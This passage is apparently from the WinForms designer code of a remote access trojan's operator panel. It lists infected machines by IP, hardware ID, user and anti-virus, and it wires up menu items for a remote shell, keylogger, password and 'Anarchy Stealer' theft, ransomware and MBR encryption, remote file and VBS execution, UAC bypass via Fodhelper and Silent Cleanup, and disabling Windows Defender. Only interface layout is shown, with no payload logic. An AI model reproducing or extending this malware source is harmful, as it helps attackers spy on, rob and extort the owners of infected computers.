            this.btnShow.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.btnShow.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.btnShow.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnShow.ForeColor = System.Drawing.Color.White;
            this.btnShow.Image = ((System.Drawing.Image)(resources.GetObject("btnShow.Image")));
            this.btnShow.Location = new System.Drawing.Point(6, 82);
            this.btnShow.Name = "btnShow";
            this.btnShow.Size = new System.Drawing.Size(46, 47);
            this.btnShow.TabIndex = 48;
            this.btnShow.Click += new System.EventHandler(this.btnShow_Click);
            // 
            // guna2Button5
            // 
            this.guna2Button5.Animated = true;
            this.guna2Button5.BackColor = System.Drawing.Color.Transparent;
            this.guna2Button5.BorderRadius = 4;
            this.guna2Button5.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Button5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2Button5.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2Button5.ForeColor = System.Drawing.Color.White;
            this.guna2Button5.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button5.Image")));
            this.guna2Button5.Location = new System.Drawing.Point(6, 176);
            this.guna2Button5.Name = "guna2Button5";
            this.guna2Button5.Size = new System.Drawing.Size(46, 47);
            this.guna2Button5.TabIndex = 50;
            this.guna2Button5.UseTransparentBackground = true;
            this.guna2Button5.Click += new System.EventHandler(this.guna2Button5_Click);
            // 
            // guna2Button9
            // 
            this.guna2Button9.Animated = true;
            this.guna2Button9.BackColor = System.Drawing.Color.Transparent;
            this.guna2Button9.BorderRadius = 4;
            this.guna2Button9.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Button9.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2Button9.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2Button9.ForeColor = System.Drawing.Color.White;
            this.guna2Button9.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button9.Image")));
            this.guna2Button9.Location = new System.Drawing.Point(6, 176);
            this.guna2Button9.Name = "guna2Button9";
            this.guna2Button9.Size = new System.Drawing.Size(46, 47);
            this.guna2Button9.TabIndex = 55;
            this.guna2Button9.UseTransparentBackground = true;
            this.guna2Button9.Visible = false;
            this.guna2Button9.Click += new System.EventHandler(this.guna2Button9_Click);
            // 
            // guna2Panel2
            // 
            this.guna2Panel2.BackColor = System.Drawing.Color.Transparent;
            this.guna2Panel2.Controls.Add(this.pictureBox4);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox4);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox3);
            this.guna2Panel2.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(72)))), ((int)(((byte)(75)))));
            this.guna2Panel2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
            this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.guna2Panel2.Location = new System.Drawing.Point(59, 0);
            this.guna2Panel2.Name = "guna2Panel2";
            this.guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.White;
            this.guna2Panel2.ShadowDecoration.Depth = 15;
            this.guna2Panel2.Size = new System.Drawing.Size(888, 41);
            this.guna2Panel2.TabIndex = 28;
            this.guna2Panel2.Paint += new System.Windows.Forms.PaintEventHandler(this.guna2Panel2_Paint);
            // 
            // pictureBox4
            // 
            this.pictureBox4.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox4.Image")));
            this.pictureBox4.Location = new System.Drawing.Point(3, 5);
            this.pictureBox4.Name = "pictureBox4";
            this.pictureBox4.Size = new System.Drawing.Size(305, 32);
            this.pictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox4.TabIndex = 22;
            this.pictureBox4.TabStop = false;
            // 
            // siticoneControlBox4
            // 
            this.siticoneControlBox4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.siticoneControlBox4.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.BorderRadius = 10;
            this.siticoneControlBox4.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.siticoneControlBox4.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.HoveredState.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox4.Location = new System.Drawing.Point(789, 5);
            this.siticoneControlBox4.Name = "siticoneControlBox4";
            this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.Size = new System.Drawing.Size(45, 29);
            this.siticoneControlBox4.TabIndex = 21;
            // 
            // siticoneControlBox3
            // 
            this.siticoneControlBox3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.siticoneControlBox3.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.BorderRadius = 10;
            this.siticoneControlBox3.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.HoveredState.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox3.Location = new System.Drawing.Point(840, 5);
            this.siticoneControlBox3.Name = "siticoneControlBox3";
            this.siticoneControlBox3.PressedColor = System.Drawing.Color.DarkRed;
            this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.Size = new System.Drawing.Size(45, 29);
            this.siticoneControlBox3.TabIndex = 20;
            this.siticoneControlBox3.Click += new System.EventHandler(this.siticoneControlBox3_Click);
            // 
            // guna2DragControl1
            // 
            this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2DragControl1.TargetControl = this.guna2Panel2;
            this.guna2DragControl1.UseTransparentDrag = true;
            // 
            // guna2DragControl2
            // 
            this.guna2DragControl2.DockIndicatorTransparencyValue = 0.6D;
            this.guna2DragControl2.UseTransparentDrag = true;
            // 
            // listView1
            // 
            this.listView1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.lv_ip,
            this.lv_country,
            this.lv_group,
            this.lv_hwid,
            this.lv_user,
            this.lv_os,
            this.lv_ins,
            this.lv_admin,
            this.lv_av});
            this.listView1.ContextMenuStrip = this.contextMenuStrip;
            this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView1.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold);
            this.listView1.ForeColor = System.Drawing.Color.White;
            this.listView1.FullRowSelect = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(59, 41);
            this.listView1.Margin = new System.Windows.Forms.Padding(2);
            this.listView1.Name = "listView1";
            this.listView1.ShowGroups = false;
            this.listView1.ShowItemToolTips = true;
            this.listView1.Size = new System.Drawing.Size(888, 419);
            this.listView1.TabIndex = 29;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            this.listView1.DrawColumnHeader += new System.Windows.Forms.DrawListViewColumnHeaderEventHandler(this.listView1_DrawColumnHeader);
            this.listView1.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(this.listView1_DrawItem);
            this.listView1.DrawSubItem += new System.Windows.Forms.DrawListViewSubItemEventHandler(this.listView1_DrawSubItem);
            this.listView1.SelectedIndexChanged += new System.EventHandler(this.listView1_SelectedIndexChanged_1);
            // 
            // lv_ip
            // 
            this.lv_ip.Text = "IP Port";
            this.lv_ip.Width = 121;
            // 
            // lv_country
            // 
            this.lv_country.Text = "Country";
            this.lv_country.Width = 124;
            // 
            // lv_group
            // 
            this.lv_group.Text = "Group";
            // 
            // lv_hwid
            // 
            this.lv_hwid.Text = "HWID";
            this.lv_hwid.Width = 117;
            // 
            // lv_user
            // 
            this.lv_user.Text = "User";
            this.lv_user.Width = 65;
            // 
            // lv_os
            // 
            this.lv_os.Text = "OS version";
            this.lv_os.Width = 99;
            // 
            // lv_ins
            // 
            this.lv_ins.Text = "Installed time";
            this.lv_ins.Width = 102;
            // 
            // lv_admin
            // 
            this.lv_admin.Text = "Permission";
            this.lv_admin.Width = 90;
            // 
            // lv_av
            // 
            this.lv_av.Text = "Anti-virus";
            this.lv_av.Width = 110;
            // 
            // contextMenuStrip
            // 
            this.contextMenuStrip.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.contextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.remoteDesktopToolStripMenuItem,
            this.sToolStripMenuItem,
            this.RemoteShellToolStripMenuItem,
            this.processManagerToolStripMenuItem,
            this.FileManagerToolStripMenuItem1,
            this.keyloggerToolStripMenuItem,
            this.passwordRecoveryToolStripMenuItem,
            this.toolStripMenuItem2,
            this.SendFileToolStripMenuItem1,
            this.toolStripMenuItem17,
            this.toolStripMenuItem20,
            this.disableWDToolStripMenuItem,
            this.ChatToolStripMenuItem1,
            this.startupTaskToolStripMenuItem,
            this.toolStripMenuItem57,
            this.toolStripMenuItem40,
            this.ClientControlToolStripMenuItem});
            this.contextMenuStrip.Name = "guna2ContextMenuStrip1";
            this.contextMenuStrip.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.contextMenuStrip.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.contextMenuStrip.RenderStyle.ColorTable = null;
            this.contextMenuStrip.RenderStyle.RoundedEdges = true;
            this.contextMenuStrip.RenderStyle.SelectionArrowColor = System.Drawing.Color.Black;
            this.contextMenuStrip.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.contextMenuStrip.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.contextMenuStrip.RenderStyle.SeparatorColor = System.Drawing.Color.DarkRed;
            this.contextMenuStrip.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
            this.contextMenuStrip.Size = new System.Drawing.Size(179, 378);
            // 
            // remoteDesktopToolStripMenuItem
            // 
            this.remoteDesktopToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.remoteDesktopToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteDesktopToolStripMenuItem.Image")));
            this.remoteDesktopToolStripMenuItem.Name = "remoteDesktopToolStripMenuItem";
            this.remoteDesktopToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.remoteDesktopToolStripMenuItem.Text = "Remote Desktop";
            this.remoteDesktopToolStripMenuItem.Click += new System.EventHandler(this.RemoteScreenToolStripMenuItem_Click);
            // 
            // sToolStripMenuItem
            // 
            this.sToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.sToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("sToolStripMenuItem.Image")));
            this.sToolStripMenuItem.Name = "sToolStripMenuItem";
            this.sToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.sToolStripMenuItem.Text = "Ransomware ";
            // 
            // EncryptToolStripMenuItem
            // 
            this.EncryptToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.EncryptToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.EncryptToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("EncryptToolStripMenuItem.Image")));
            this.EncryptToolStripMenuItem.Name = "EncryptToolStripMenuItem";
            this.EncryptToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.EncryptToolStripMenuItem.Text = "Encrypt";
            this.EncryptToolStripMenuItem.Click += new System.EventHandler(this.EncryptToolStripMenuItem_Click);
            // 
            // DecryptToolStripMenuItem
            // 
            this.DecryptToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.DecryptToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.DecryptToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("DecryptToolStripMenuItem.Image")));
            this.DecryptToolStripMenuItem.Name = "DecryptToolStripMenuItem";
            this.DecryptToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.DecryptToolStripMenuItem.Text = "Decrypt";
            this.DecryptToolStripMenuItem.Click += new System.EventHandler(this.DecryptToolStripMenuItem_Click);
            // 
            // mBRSettingsToolStripMenuItem
            // 
            this.mBRSettingsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.mBRSettingsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.mBRSettingsToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mBRSettingsToolStripMenuItem.Image")));
            this.mBRSettingsToolStripMenuItem.Name = "mBRSettingsToolStripMenuItem";
            this.mBRSettingsToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.mBRSettingsToolStripMenuItem.Text = "MBR Settings";
            this.mBRSettingsToolStripMenuItem.Click += new System.EventHandler(this.mBRSettingsToolStripMenuItem_Click);
            // 
            // mBREncryptToolStripMenuItem
            // 
            this.mBREncryptToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.mBREncryptToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.mBREncryptToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mBREncryptToolStripMenuItem.Image")));
            this.mBREncryptToolStripMenuItem.Name = "mBREncryptToolStripMenuItem";
            this.mBREncryptToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.mBREncryptToolStripMenuItem.Text = "MBR Encrypt";
            this.mBREncryptToolStripMenuItem.Click += new System.EventHandler(this.mBREncryptToolStripMenuItem_Click);
            // 
            // RemoteShellToolStripMenuItem
            // 
            this.RemoteShellToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.RemoteShellToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("RemoteShellToolStripMenuItem.Image")));
            this.RemoteShellToolStripMenuItem.Name = "RemoteShellToolStripMenuItem";
            this.RemoteShellToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.RemoteShellToolStripMenuItem.Text = "Remote Shell";
            this.RemoteShellToolStripMenuItem.Click += new System.EventHandler(this.RemoteShellToolStripMenuItem_Click);
            // 
            // processManagerToolStripMenuItem
            // 
            this.processManagerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.processManagerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("processManagerToolStripMenuItem.Image")));
            this.processManagerToolStripMenuItem.Name = "processManagerToolStripMenuItem";
            this.processManagerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.processManagerToolStripMenuItem.Text = "Process Manager";
            this.processManagerToolStripMenuItem.Click += new System.EventHandler(this.ProcessManagerToolStripMenuItem_Click);
            // 
            // FileManagerToolStripMenuItem1
            // 
            this.FileManagerToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.FileManagerToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("FileManagerToolStripMenuItem1.Image")));
            this.FileManagerToolStripMenuItem1.Name = "FileManagerToolStripMenuItem1";
            this.FileManagerToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
            this.FileManagerToolStripMenuItem1.Text = "File Manager";
            this.FileManagerToolStripMenuItem1.Click += new System.EventHandler(this.FileManagerToolStripMenuItem1_Click);
            // 
            // keyloggerToolStripMenuItem
            // 
            this.keyloggerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.keyloggerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("keyloggerToolStripMenuItem.Image")));
            this.keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
            this.keyloggerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.keyloggerToolStripMenuItem.Text = "Keylogger ";
            this.keyloggerToolStripMenuItem.Click += new System.EventHandler(this.KeyloggerToolStripMenuItem1_Click);
            // 
            // passwordRecoveryToolStripMenuItem
            // 
            this.passwordRecoveryToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.passwordRecoveryToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("passwordRecoveryToolStripMenuItem.Image")));
            this.passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
            this.passwordRecoveryToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.passwordRecoveryToolStripMenuItem.Text = "Password Recovery";
            this.passwordRecoveryToolStripMenuItem.Click += new System.EventHandler(this.PasswordRecoveryToolStripMenuItem_Click);
            // 
            // toolStripMenuItem2
            // 
            this.toolStripMenuItem2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.toolStripMenuItem2.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem2.Image")));
            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
            this.toolStripMenuItem2.Size = new System.Drawing.Size(180, 22);
            this.toolStripMenuItem2.Text = "Anarchy Stealer";
            this.toolStripMenuItem2.Click += new System.EventHandler(this.toolStripMenuItem2_Click_2);
            // 
            // sToolStripMenuItem1
            // 
            this.sToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.sToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.sToolStripMenuItem1.Name = "sToolStripMenuItem1";
            this.sToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
            this.sToolStripMenuItem1.Text = "Launch Stealer";
            this.sToolStripMenuItem1.Click += new System.EventHandler(this.sToolStripMenuItem1_Click);
            // 
            // settingsToolStripMenuItem
            // 
            this.settingsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.settingsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.settingsToolStripMenuItem.Name = "settingsToolStripMenuItem";
            this.settingsToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.settingsToolStripMenuItem.Text = "Settings";
            this.settingsToolStripMenuItem.Click += new System.EventHandler(this.settingsToolStripMenuItem_Click);
            // 
            // SendFileToolStripMenuItem1
            // 
            this.SendFileToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.fromUrlToolStripMenuItem,
            this.SendFileToDiskToolStripMenuItem,
            this.SendFileToMemoryToolStripMenuItem,
            this.mergeregToolStripMenuItem,
            this.executeVBSToolStripMenuItem});
            this.SendFileToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.SendFileToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("SendFileToolStripMenuItem1.Image")));
            this.SendFileToolStripMenuItem1.Name = "SendFileToolStripMenuItem1";
            this.SendFileToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
            this.SendFileToolStripMenuItem1.Text = "Execute File";
            // 
            // fromUrlToolStripMenuItem
            // 
            this.fromUrlToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.fromUrlToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.fromUrlToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("fromUrlToolStripMenuItem.Image")));
            this.fromUrlToolStripMenuItem.Name = "fromUrlToolStripMenuItem";
            this.fromUrlToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
            this.fromUrlToolStripMenuItem.Text = "Web File";
            this.fromUrlToolStripMenuItem.Click += new System.EventHandler(this.fromUrlToolStripMenuItem_Click);
            // 
            // SendFileToDiskToolStripMenuItem
            // 
            this.SendFileToDiskToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.SendFileToDiskToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.SendFileToDiskToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("SendFileToDiskToolStripMenuItem.Image")));
            this.SendFileToDiskToolStripMenuItem.Name = "SendFileToDiskToolStripMenuItem";
            this.SendFileToDiskToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
            this.SendFileToDiskToolStripMenuItem.Text = "Local File  [Disk]";
            this.SendFileToDiskToolStripMenuItem.Click += new System.EventHandler(this.SendFileToDiskToolStripMenuItem_Click_1);
            // 
            // SendFileToMemoryToolStripMenuItem
            // 
            this.SendFileToMemoryToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.SendFileToMemoryToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.SendFileToMemoryToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("SendFileToMemoryToolStripMenuItem.Image")));
            this.SendFileToMemoryToolStripMenuItem.Name = "SendFileToMemoryToolStripMenuItem";
            this.SendFileToMemoryToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
            this.SendFileToMemoryToolStripMenuItem.Text = "Local File [Memory]";
            this.SendFileToMemoryToolStripMenuItem.Click += new System.EventHandler(this.SendFileToMemoryToolStripMenuItem_Click_1);
            // 
            // mergeregToolStripMenuItem
            // 
            this.mergeregToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.mergeregToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.mergeregToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mergeregToolStripMenuItem.Image")));
            this.mergeregToolStripMenuItem.Name = "mergeregToolStripMenuItem";
            this.mergeregToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
            this.mergeregToolStripMenuItem.Text = "Merge .reg ";
            this.mergeregToolStripMenuItem.Click += new System.EventHandler(this.mergeregToolStripMenuItem_Click);
            // 
            // executeVBSToolStripMenuItem
            // 
            this.executeVBSToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.executeVBSToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.executeVBSToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("executeVBSToolStripMenuItem.Image")));
            this.executeVBSToolStripMenuItem.Name = "executeVBSToolStripMenuItem";
            this.executeVBSToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
            this.executeVBSToolStripMenuItem.Text = "Execute VBS";
            this.executeVBSToolStripMenuItem.Click += new System.EventHandler(this.executeVBSToolStripMenuItem_Click);
            // 
            // toolStripMenuItem17
            // 
            this.toolStripMenuItem17.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.toolStripMenuItem17.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.fodhelperToolStripMenuItem,
            this.SilentCleanupToolStripMenuItem,
            this.RunasToolStripMenuItem});
            this.toolStripMenuItem17.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.toolStripMenuItem17.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem17.Image")));
            this.toolStripMenuItem17.Name = "toolStripMenuItem17";
            this.toolStripMenuItem17.Size = new System.Drawing.Size(180, 22);
            this.toolStripMenuItem17.Text = "Bypass UAC";
            // 
            // fodhelperToolStripMenuItem
            // 
            this.fodhelperToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.fodhelperToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.fodhelperToolStripMenuItem.Name = "fodhelperToolStripMenuItem";
            this.fodhelperToolStripMenuItem.Size = new System.Drawing.Size(251, 22);
            this.fodhelperToolStripMenuItem.Text = "Windows 8/10/11 | Fodhelper";
            this.fodhelperToolStripMenuItem.Click += new System.EventHandler(this.FodhelperToolStripMenuItem_Click);
            // 
            // SilentCleanupToolStripMenuItem
            // 
            this.SilentCleanupToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.SilentCleanupToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.SilentCleanupToolStripMenuItem.Name = "SilentCleanupToolStripMenuItem";
            this.SilentCleanupToolStripMenuItem.Size = new System.Drawing.Size(251, 22);
            this.SilentCleanupToolStripMenuItem.Text = "Windows 8/10/11 | Silent Cleanup";
            this.SilentCleanupToolStripMenuItem.Click += new System.EventHandler(this.SilentCleanupToolStripMenuItem_Click);
            // 
            // RunasToolStripMenuItem
            // 
            this.RunasToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.RunasToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.RunasToolStripMenuItem.Name = "RunasToolStripMenuItem";
            this.RunasToolStripMenuItem.Size = new System.Drawing.Size(251, 22);
            this.RunasToolStripMenuItem.Text = "Elevate Permissions | Runas";
            this.RunasToolStripMenuItem.Click += new System.EventHandler(this.RunasToolStripMenuItem_Click);
            // 
            // toolStripMenuItem20
            // 
            this.toolStripMenuItem20.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.toolStripMenuItem20.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.DisableUACToolStripMenuItem});
            this.toolStripMenuItem20.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.toolStripMenuItem20.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem20.Image")));
            this.toolStripMenuItem20.Name = "toolStripMenuItem20";
            this.toolStripMenuItem20.Size = new System.Drawing.Size(180, 22);
            this.toolStripMenuItem20.Text = "Disable UAC";
            this.toolStripMenuItem20.Click += new System.EventHandler(this.toolStripMenuItem20_Click);
            // 
            // DisableUACToolStripMenuItem
            // 
            this.DisableUACToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.DisableUACToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
